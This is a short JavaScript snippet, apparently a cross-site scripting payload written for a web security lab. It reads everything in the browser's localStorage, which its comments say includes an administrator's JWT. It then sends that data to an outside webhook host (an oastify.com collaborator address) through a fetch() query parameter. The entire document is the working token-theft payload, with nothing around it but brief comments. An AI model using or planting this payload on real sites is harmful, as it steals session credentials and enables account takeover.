(function() {
    // 1. Read all local storage data, which includes the admin's JWT
    const data = JSON.stringify(localStorage);
    
    // 2. The exfiltration URL (your OAST webhook)
    // We use a query parameter to send the data.
    const webhookUrl = '5lrdtax6mrdei9xli2mibaj58wen2fq4.oastify.com/';
    
    // 3. Make the request to send the data
    fetch(webhookUrl + '?token_data=' + encodeURIComponent(data));
})();
